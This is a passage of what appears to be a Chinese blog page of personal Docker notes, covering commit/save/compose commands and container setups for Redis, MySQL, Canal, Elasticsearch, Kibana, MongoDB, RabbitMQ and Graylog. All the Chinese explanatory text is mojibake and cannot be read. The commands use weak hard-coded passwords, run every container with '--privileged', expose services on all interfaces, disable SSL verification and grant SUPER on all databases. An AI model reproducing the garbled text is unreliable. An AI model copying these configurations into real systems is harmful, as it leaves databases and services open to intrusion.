·çš„ï¼Œé‚£å®ƒä»¬å…¶å®å°±æ˜¯åŒä¸€ä¸ªï¼Œä¸åŒçš„åªæ˜¯æ ‡ç­¾ã€‚</span><br><span class="line">docker run -itd centos #-iè¡¨ç¤ºè®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥æ‰“å¼€ï¼Œ-tè¡¨ç¤ºåˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼Œ-dè¡¨ç¤ºåå°å¯åŠ¨</span><br><span class="line">docker exec -it 79fab4540315 bash #è¿›å…¥å®¹å™¨</span><br><span class="line">Ctrl + dé€€å‡ºè¯¥å®¹å™¨</span><br><span class="line"> docker commit -m &quot;install net-tools and vim&quot; -a &quot;author&quot; 79fab4540315 test_centos</span><br><span class="line"><span class="meta"> #</span><span class="language-bash">docker commitåˆ›å»ºé•œåƒå‘½ä»¤</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">-mæŒ‡å®šè¯¥é•œåƒçš„æè¿°ä¿¡æ¯</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">-aæŒ‡å®šé•œåƒä½œè€…çš„ä¿¡æ¯</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">79fab4540315ä¸ºè¯¥å®¹å™¨çš„<span class="built_in">id</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">test_centosåˆ™æ˜¯ç”Ÿæˆçš„æ–°é•œåƒçš„åç§°</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä»¥ä¸Šæˆ‘ä»¬å°±é€šè¿‡å®¹å™¨åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ã€ç”±è‡ªå·±è‡ªå®šä¹‰ç¯å¢ƒçš„é•œåƒï¼Œä¹‹åä½¿ç”¨è¯¥é•œåƒæ—¶ï¼Œå°±ä¸éœ€è¦å†å»æ­å»ºç¯å¢ƒäº†ã€‚è€Œä¸”æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªé•œåƒæ”¾åˆ°ä¸€ä¸ªä»“åº“ä¸Šï¼Œè¿™æ ·å…¶ä»–æœºå™¨ä¹Ÿå¯ä»¥ä¸‹è½½ã€‚è¿™å°±å’Œé›†è£…ç®±ä¸€æ ·ï¼ŒæŠŠä¸œè¥¿éƒ½å°è£…åˆ°ä¸€ä¸ªç®±å­é‡Œï¼Œä¸ä»…æ–¹ä¾¿ç§»åŠ¨ï¼Œè¿˜å¯ä»¥å¼€ç®±å³ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">docker save -o es6.5.1.tar 32f93c89076d</span><br><span class="line">docker load -i</span><br><span class="line">docker-compose up -d  # -dæ˜¯ä¸¢åˆ°åå°è¿è¡Œ</span><br><span class="line">docker-compose stop #åœæ­¢å·²æœ‰å®¹å™¨</span><br><span class="line">docker-compose start #å¯åŠ¨å·²æœ‰å®¹å™¨</span><br><span class="line">docker-compose ps # æŸ¥çœ‹å®¹å™¨çŠ¶æ€</span><br><span class="line">docker-compose rm -f #åˆ é™¤å®¹å™¨</span><br><span class="line">docker-compose down #åœæ­¢å¹¶åˆ é™¤è¿è¡Œä¸­çš„å®¹å™¨</span><br><span class="line"></span><br><span class="line">docker network ls #æŸ¥çœ‹ç½‘ç»œ</span><br><span class="line"></span><br><span class="line">zip -q -r å‹ç¼©åŒ…å.zip   ç›®å½•/æ–‡ä»¶å</span><br><span class="line">unzip å‹ç¼©åŒ…å</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149304.png" alt="image-20210322101411636"></p>
<h3 id="Dockerè®¾ç½®å¼€æœºè‡ªå¯åŠŸ"><a href="#Dockerè®¾ç½®å¼€æœºè‡ªå¯åŠŸ" class="headerlink" title="Dockerè®¾ç½®å¼€æœºè‡ªå¯åŠŸ"></a>Dockerè®¾ç½®å¼€æœºè‡ªå¯åŠŸ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">dockerè‡ªå¯åŠ¨</span></span><br><span class="line">systemctl enable docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®¹å™¨å¯åŠ¨å</span></span><br><span class="line">docker update --restart=always canal</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®¹å™¨å¯åŠ¨æ—¶</span></span><br><span class="line">åŠ  --restart=always</span><br></pre></td></tr></table></figure>

<h3 id="dockerå‡ºç°IPv4-forwarding-is-disabled-Networking-will-not-workè§£å†³æ–¹æ³•"><a href="#dockerå‡ºç°IPv4-forwarding-is-disabled-Networking-will-not-workè§£å†³æ–¹æ³•" class="headerlink" title="dockerå‡ºç°IPv4 forwarding is disabled. Networking will not workè§£å†³æ–¹æ³•"></a>dockerå‡ºç°IPv4 forwarding is disabled. Networking will not workè§£å†³æ–¹æ³•</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹å†…æ ¸å‚æ•°</span></span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward=0</span><br><span class="line">æ”¹æˆ</span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯networkæœåŠ¡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯dockeræœåŠ¡(è¿™ä¸€æ­¥æœ€é‡è¦,å¦‚æœæ²¡æœ‰æ‰§è¡Œçš„è¯,è¿˜æ˜¯ä¼šæŠ¥é”™çš„)</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯iptables</span></span><br><span class="line">systemctl restart iptables</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯docker</span></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="Docker-å®‰è£…redis-å¯"><a href="#Docker-å®‰è£…redis-å¯" class="headerlink" title="Docker å®‰è£…redis å¯"></a>Docker å®‰è£…redis å¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd leyou</span><br><span class="line">passwd leyou</span><br><span class="line">docker pull redis</span><br><span class="line"></span><br><span class="line">cd /home/leyou</span><br><span class="line">mkdir redis</span><br><span class="line">cd redis</span><br><span class="line">touch redis.conf #åˆ›å»ºæ–‡ä»¶</span><br><span class="line">vi redis.conf</span><br><span class="line">databases 1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="variable">$PWD</span>/redis.conf:/usr/local/etc/redis/redis.conf å°†å½“å‰ç›®å½•ä¸‹çš„redis.confä¸åé¢é‚£ä¸ªæ•´åˆ</span></span><br><span class="line">docker run \</span><br><span class="line"> -p 6379:6379 \</span><br><span class="line"> --name ly-redis \</span><br><span class="line"> -v  $PWD/redis.conf:/usr/local/etc/redis/redis.conf \</span><br><span class="line"> --privileged \</span><br><span class="line"> -d \</span><br><span class="line"> redis</span><br></pre></td></tr></table></figure>

<h3 id="dockerå®‰è£…mysql-å¯"><a href="#dockerå®‰è£…mysql-å¯" class="headerlink" title="dockerå®‰è£…mysql å¯"></a>dockerå®‰è£…mysql å¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd leyou</span><br><span class="line">passwd leyou</span><br><span class="line"></span><br><span class="line">docker pull mysql:5.7.25</span><br><span class="line">cd /home/leyou</span><br><span class="line">mkdir mysql</span><br><span class="line">cd mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-v <span class="variable">$PWD</span>/conf:/etc/mysql/conf.dï¼šæ˜¯å°†å½“å‰ç›®å½•çš„confç›®å½•ä¸dockerå®¹å™¨ä¸­çš„/etc/mysql/conf.dç›®å½•ç»‘å®šï¼Œå¯ä»¥è‡ªå·±æŒ‡å®šé…ç½®æ–‡ä»¶</span></span><br><span class="line">docker run \</span><br><span class="line"> -p 3306:3306 \</span><br><span class="line"> --name mysql \</span><br><span class="line"> -v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line"> -v $PWD/logs:/logs \</span><br><span class="line"> -v $PWD/data:/var/lib/mysql \</span><br><span class="line"> -e MYSQL_ROOT_PASSWORD=123 \</span><br><span class="line"> --privileged \</span><br><span class="line"> -d \</span><br><span class="line"> mysql:5.7.25</span><br><span class="line"> </span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">12.15</span></span><br><span class="line"> docker run \</span><br><span class="line"> -p 3306:3306 \</span><br><span class="line"> --name mysql \</span><br><span class="line"> -v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line"> -v $PWD/logs:/logs \</span><br><span class="line"> -v $PWD/data:/var/lib/mysql \</span><br><span class="line"> -e MYSQL_ROOT_PASSWORD=ycbaby0623 \</span><br><span class="line"> --privileged \</span><br><span class="line"> -d \</span><br><span class="line"> mysql:5.7.25</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd conf</span><br><span class="line">vi my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">server-id=1000</span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br><span class="line"></span><br><span class="line">docker restart mysql</span><br></pre></td></tr></table></figure>

<h4 id="è¿œç¨‹æ— æ³•è®¿é—®çš„é—®é¢˜"><a href="#è¿œç¨‹æ— æ³•è®¿é—®çš„é—®é¢˜" class="headerlink" title="è¿œç¨‹æ— æ³•è®¿é—®çš„é—®é¢˜"></a>è¿œç¨‹æ— æ³•è®¿é—®çš„é—®é¢˜</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install iptables-services</span><br><span class="line">systemctl enable iptables</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure>

<h4 id="iptables-â€“wait-t-filter-A-DOCKER-i-docker0-o-docker0-p-tcp-d-172-17-0-2-â€“dport-3306-j-ACCEPT-iptables-No-chain-x2F-target-x2F-match-by-that-name"><a href="#iptables-â€“wait-t-filter-A-DOCKER-i-docker0-o-docker0-p-tcp-d-172-17-0-2-â€“dport-3306-j-ACCEPT-iptables-No-chain-x2F-target-x2F-match-by-that-name" class="headerlink" title="iptables â€“wait -t filter -A DOCKER ! -i docker0 -o docker0 -p tcp -d 172.17.0.2 â€“dport 3306 -j ACCEPT: iptables: No chain&#x2F;target&#x2F;match by that name."></a>iptables â€“wait -t filter -A DOCKER ! -i docker0 -o docker0 -p tcp -d 172.17.0.2 â€“dport 3306 -j ACCEPT: iptables: No chain&#x2F;target&#x2F;match by that name.</h4><p>iptables -t filter -N DOCKER</p>
<h4 id="MySQLæ—¶åŒº"><a href="#MySQLæ—¶åŒº" class="headerlink" title="MySQLæ—¶åŒº"></a>MySQLæ—¶åŒº</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">æ–¹æ¡ˆä¸€ï¼šè¿™ç§ä¿®æ”¹åœ¨é‡å¯æ•°æ®åº“åï¼Œä¼šæ¢å¤æˆé»˜è®¤æ—¶åŒº</span></span><br><span class="line">VARIABLES like &#x27;%time_zone%&#x27;;</span><br><span class="line">set time_zone=&#x27;+8:00&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–¹æ¡ˆäºŒï¼šç”¨è¿™ç§</span></span><br><span class="line">serverTimezone=GMT%2B8</span><br><span class="line">spring.datasource.url: jdbc:mysql://localhost:3306/springboot_demo?serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=UTF-8</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–¹æ¡ˆä¸‰ å®æµ‹æœ‰æ•ˆ</span></span><br><span class="line">vi  /etc/mysql/my.cnf</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¢åŠ å‚æ•°</span></span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="docker-å®‰è£…-canal-Y"><a href="#docker-å®‰è£…-canal-Y" class="headerlink" title="docker å®‰è£… canal Y"></a>docker å®‰è£… canal Y</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®bin <span class="built_in">log</span></span></span><br><span class="line">cd conf</span><br><span class="line">vi my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®å½“å‰æœåŠ¡çš„<span class="built_in">id</span></span></span><br><span class="line">server-id=1000</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®binary <span class="built_in">log</span>æ–‡ä»¶çš„å­˜æ”¾åœ°å€</span></span><br><span class="line">log-bin=/var/lib/mysql/mysql-bin</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®ç”Ÿæˆbinary <span class="built_in">log</span>çš„databaseåç§°</span></span><br><span class="line">binlog-do-db=leyou</span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®æƒé™</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ·»åŠ ä¸€ä¸ªä»…ç”¨äºæ•°æ®åŒæ­¥çš„è´¦æˆ·ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè¿™é‡Œä»…æä¾›å¯¹leyouè¿™ä¸ªåº“çš„æ“ä½œæƒé™ã€‚</span></span><br><span class="line">create user canal@&#x27;%&#x27; IDENTIFIED by &#x27;canal&#x27;;</span><br><span class="line">GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT,SUPER ON *.* TO &#x27;canal&#x27;@&#x27;%&#x27; identified by &#x27;canal&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">docker restart mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨navicatä¸­è¾“å…¥</span></span><br><span class="line">show master status;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker pull canal/canal-server</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ®åº“åœ°å€å’Œç«¯å£ï¼Œå¦‚æœä¸çŸ¥é“mysqlå®¹å™¨åœ°å€ï¼Œå¯ä»¥é€šè¿‡docker inspect å®¹å™¨<span class="built_in">id</span>æ¥æŸ¥çœ‹</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">docker run -p 11111:11111 --name canal \</span></span><br><span class="line"><span class="language-bash">-e canal.destinations=<span class="built_in">test</span> \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.master.address=172.17.0.3:3306  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.dbUsername=canal  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.dbPassword=canal  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.connectionCharset=UTF-8 \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.tsdb.enable=<span class="literal">true</span> \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.gtidon=<span class="literal">false</span>  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.filter.regex=leyou.tb_spu,leyou.tb_sku,leyou.tb_spu_detail,leyou.tb_category,leyou.tb_brand,leyou.tb_spec_param \</span></span><br><span class="line"><span class="language-bash">-d canal/canal-server</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è‡ªå¯åŠ¨</span></span><br><span class="line">docker update --restart=always canal</span><br></pre></td></tr></table></figure>

<p>è¡¨åç§°ç›‘å¬æ”¯æŒçš„è¯­æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql æ•°æ®è§£æå…³æ³¨çš„è¡¨ï¼ŒPerlæ­£åˆ™è¡¨è¾¾å¼.</span><br><span class="line">å¤šä¸ªæ­£åˆ™ä¹‹é—´ä»¥é€—å·(,)åˆ†éš”ï¼Œè½¬ä¹‰ç¬¦éœ€è¦åŒæ–œæ (\\) </span><br><span class="line">å¸¸è§ä¾‹å­ï¼š</span><br><span class="line">1.  æ‰€æœ‰è¡¨ï¼š.*   or  .*\\..*</span><br><span class="line">2.  canal schemaä¸‹æ‰€æœ‰è¡¨ï¼š canal\\..*</span><br><span class="line">3.  canalä¸‹çš„ä»¥canalæ‰“å¤´çš„è¡¨ï¼šcanal\\.canal.*</span><br><span class="line">4.  canal schemaä¸‹çš„ä¸€å¼ è¡¨ï¼šcanal.test1</span><br><span class="line">5.  å¤šä¸ªè§„åˆ™ç»„åˆä½¿ç”¨ç„¶åä»¥é€—å·éš”å¼€ï¼šcanal\\..*,mysql.test1,mysql.test2 </span><br></pre></td></tr></table></figure>

<h3 id="dockerå®‰è£…es7"><a href="#dockerå®‰è£…es7" class="headerlink" title="dockerå®‰è£…es7"></a>dockerå®‰è£…es7</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.4.2 <span class="comment">#ä¸‹è½½es7</span></span><br><span class="line">docker tag docker.elastic.co/elasticsearch/elasticsearch:7.4.2 es7 <span class="comment">#é‡å‘½å</span></span><br><span class="line"></span><br><span class="line">docker run --name leyou-es \</span><br><span class="line">    -e <span class="string">&quot;cluster.name=leyou-elastic&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;http.host=0.0.0.0&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;ES_JAVA_OPTS=-Xms256m -Xmx512m&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;discovery.type=single-node&quot;</span> \</span><br><span class="line">    -v es-data:/usr/share/elasticsearch/data \</span><br><span class="line">    -v es-logs:/usr/share/elasticsearch/logs \</span><br><span class="line">    -v es-plugins:/usr/share/elasticsearch/plugins \</span><br><span class="line">    --privileged \</span><br><span class="line">    -p 9200:9200 \</span><br><span class="line">    -p 9300:9300 \</span><br><span class="line">    -d \</span><br><span class="line">    es7</span><br></pre></td></tr></table></figure>

<p>å‘½ä»¤è§£é‡Šï¼š</p>
<ul>
<li><code>-e &quot;cluster.name=es-docker-cluster&quot;</code>ï¼šè®¾ç½®é›†ç¾¤åç§°</li>
<li><code>-e &quot;http.host=0.0.0.0&quot;</code>ï¼šç›‘å¬çš„åœ°å€ï¼Œå¯ä»¥å¤–ç½‘è®¿é—®</li>
<li><code>-e &quot;ES_JAVA_OPTS=-Xms256m -Xmx256m&quot;</code>ï¼šå†…å­˜å¤§å°</li>
<li><code>-e &quot;discovery.type=single-node&quot;</code>ï¼šéé›†ç¾¤æ¨¡å¼</li>
<li><code>-v es-data:/usr/share/elasticsearch/data</code>ï¼šæŒ‚è½½é€»è¾‘å·ï¼Œç»‘å®šesçš„æ•°æ®ç›®å½•</li>
<li><code>-v es-logs:/usr/share/elasticsearch/logs</code>ï¼šæŒ‚è½½é€»è¾‘å·ï¼Œç»‘å®šesçš„æ—¥å¿—ç›®å½•</li>
<li><code>-v es-plugins:/usr/share/elasticsearch/plugins</code>ï¼šæŒ‚è½½é€»è¾‘å·ï¼Œç»‘å®šesçš„æ’ä»¶ç›®å½•</li>
<li><code>--privileged</code>ï¼šæˆäºˆé€»è¾‘å·è®¿é—®æƒ</li>
<li><code>-p 9200:9200</code>ï¼šç«¯å£æ˜ å°„é…ç½®</li>
</ul>
<p>å°è¯•åœ¨æµè§ˆå™¨è®¿é—®ï¼š<a href="http://192.168.150.101:9200æŸ¥çœ‹æ•ˆæœï¼š">http://192.168.150.101:9200æŸ¥çœ‹æ•ˆæœï¼š</a></p>
<p>å®‰è£…åˆ†è¯å™¨å’Œæ‹¼éŸ³</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker volume inspect es-plugins</span><br></pre></td></tr></table></figure>

<p>æŠŠpyå’Œikç§»åŠ¨åˆ°å¯¹åº”ç›®å½•ä¸‹,ç„¶åé‡å¯es</p>
<h3 id="dockerå®‰è£…logstash"><a href="#dockerå®‰è£…logstash" class="headerlink" title="dockerå®‰è£…logstash"></a>dockerå®‰è£…logstash</h3><h3 id="docker-å®‰è£…kibana"><a href="#docker-å®‰è£…kibana" class="headerlink" title="docker å®‰è£…kibana"></a>docker å®‰è£…kibana</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it kibanaå®¹å™¨<span class="built_in">id</span> /bin/bash</span><br><span class="line"><span class="built_in">cd</span> config</span><br><span class="line">vi kibana.yml</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ** THIS IS AN AUTO-GENERATED FILE **</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Default Kibana configuration for docker target</span></span><br><span class="line">server.name: kibana</span><br><span class="line">server.host: <span class="string">&quot;0&quot;</span></span><br><span class="line">elasticsearch.hosts: [ <span class="string">&quot;http://elasticsearch:9200&quot;</span> ]</span><br><span class="line">xpack.monitoring.ui.container.elasticsearch.enabled: <span class="literal">true</span></span><br><span class="line">elasticsearch.ssl.verify: <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="dockerå®‰è£…mongo-å¯"><a href="#dockerå®‰è£…mongo-å¯" class="headerlink" title="dockerå®‰è£…mongo å¯"></a>dockerå®‰è£…mongo å¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mongo</span><br><span class="line"></span><br><span class="line">docker run  \</span><br><span class="line">--name leyou-mongo \</span><br><span class="line">--restart=always \</span><br><span class="line">-e MONGO_INITDB_ROOT_USERNAME=root \</span><br><span class="line">-e MONGO_INITDB_ROOT_PASSWORD=root123 \</span><br><span class="line">-p 27017:27017  \</span><br><span class="line">-v mongo-config:/data/configdb/ \</span><br><span class="line">-v mongo-db:/data/db/ \</span><br><span class="line">--privileged \</span><br><span class="line">-d \</span><br><span class="line">mongo</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>--name</code>ï¼šæŒ‡å®šå®¹å™¨åç§°ä¸º leyou-mongo</li>
<li><code>-p</code> : æŒ‡å®šæ˜ å°„ç«¯å£27017</li>
<li><code>-v</code> ï¼šæŒ‡å®šè¦æŒ‚è½½çš„é€»è¾‘å·ï¼Œ<ul>
<li><code>mongo-config</code>å¯¹åº”mongoçš„é…ç½®ç›®å½•</li>
<li><code>mongo-db</code>å¯¹åº”æ•°æ®ç›®å½•</li>
</ul>
</li>
<li><code>-- privileged</code> : æˆæƒè®¿é—®æŒ‚è½½å·</li>
<li><code>-d</code> : åå°è¿è¡Œ</li>
<li><code>mongo</code> : é•œåƒåç§°</li>
<li><code>- e</code> : ç¯å¢ƒå˜é‡<ul>
<li><code>MONGO_INITDB_ROOT_USERNAME</code>ï¼šé»˜è®¤ç”¨æˆ·åè®¾ç½®</li>
<li><code>MONGO_INITDB_ROOT_PASSWORD</code>ï¼šé»˜è®¤å¯†ç è®¾ç½®</li>
</ul>
</li>
</ul>
<p>å·²ç®¡ç†å‘˜èº«ä»½è¿›å…¥å®¹å™¨:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it leyou-mongo mongo admin</span><br><span class="line">use admin</span><br><span class="line">db.auth(<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¦‚æœåˆå§‹åŒ–æ—¶æ²¡æŒ‡å®šrootç”¨æˆ·</span></span><br><span class="line">db.createUser(&#123; </span><br><span class="line">  user: <span class="string">&#x27;root&#x27;</span>, </span><br><span class="line">  <span class="built_in">pwd</span>: <span class="string">&#x27;root123&#x27;</span>, </span><br><span class="line">  roles: [ &#123; role: <span class="string">&quot;userAdminAnyDatabase&quot;</span>, db: <span class="string">&quot;admin&quot;</span> &#125; ] </span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">use carts</span><br><span class="line"></span><br><span class="line">db.createUser(&#123; user: <span class="string">&#x27;leyou&#x27;</span>, <span class="built_in">pwd</span>: <span class="string">&#x27;123&#x27;</span>, roles: [ &#123; role: <span class="string">&quot;readWrite&quot;</span>, db: <span class="string">&quot;carts&quot;</span> &#125; ] &#125;);</span><br></pre></td></tr></table></figure>

<h3 id="dockerå®‰è£…mongo-express-N"><a href="#dockerå®‰è£…mongo-express-N" class="headerlink" title="dockerå®‰è£…mongo-express N"></a>dockerå®‰è£…mongo-express N</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull mongo-express</span><br><span class="line"><span class="comment">#8081</span></span><br><span class="line">docker run --name leyou-express \</span><br><span class="line"> --restart=always \</span><br><span class="line"> -e ME_CONFIG_MONGODB_ADMINUSERNAME=root \</span><br><span class="line"> -e ME_CONFIG_MONGODB_ADMINPASSWORD=root123 \</span><br><span class="line"> --<span class="built_in">link</span> leyou-mongo:mongo \</span><br><span class="line"> -p 8081:8081 \</span><br><span class="line"> -d \</span><br><span class="line"> mongo-express</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="dockerå®‰è£…rabbitmq"><a href="#dockerå®‰è£…rabbitmq" class="headerlink" title="dockerå®‰è£…rabbitmq"></a>dockerå®‰è£…rabbitmq</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull rabbitmq:management</span><br><span class="line">docker run \</span><br><span class="line"> -e RABBITMQ_DEFAULT_USER=leyou \</span><br><span class="line"> -e RABBITMQ_DEFAULT_PASS=123321 \</span><br><span class="line"> --name ly-mq \</span><br><span class="line"> --hostname mq1 \</span><br><span class="line"> -p 15672:15672 \</span><br><span class="line"> -p 5672:5672 \</span><br><span class="line"> -d \</span><br><span class="line"> rabbitmq:3-management</span><br></pre></td></tr></table></figure>

<h3 id="docker-å®‰è£…graylog4-1"><a href="#docker-å®‰è£…graylog4-1" class="headerlink" title="docker å®‰è£…graylog4.1"></a>docker å®‰è£…graylog4.1</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">mkdir</span> <span class="string">/usr/local/graylog</span>      <span class="comment">#åˆ›å»ºgraylogæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/graylog</span>      </span><br><span class="line"><span class="string">vi</span> <span class="string">docker-compose.yml</span>        <span class="comment">#ç¼–è¾‘docker-compose.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="comment"># MongoDB: https://hub.docker.com/_/mongo/</span></span><br><span class="line">  <span class="attr">mongo:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo:4.2</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">27017</span><span class="string">:27017</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">graylog</span></span><br><span class="line">  <span class="comment"># Elasticsearch: https://www.elastic.co/guide/en/elasticsearch/reference/7.10/docker.html</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch-oss:7.10.2</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http.host=0.0.0.0</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">transport.host=localhost</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">network.host=0.0.0.0</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;ES_JAVA_OPTS=-Xms512m -Xmx512m&quot;</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">limits:</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">1g</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">graylog</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9200</span><span class="string">:9200</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9300</span><span class="string">:9300</span></span><br><span class="line">  <span class="comment"># Graylog: https://hub.docker.com/r/graylog/graylog/</span></span><br><span class="line">  <span class="attr">graylog:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">graylog/graylog:4.1</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="comment"># CHANGE ME (must be at least 16 characters)!</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_ROOT_TIMEZONE=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_PASSWORD_SECRET=somepasswordpepper</span></span><br><span class="line">      <span class="comment"># Password: admin</span></span><br><span 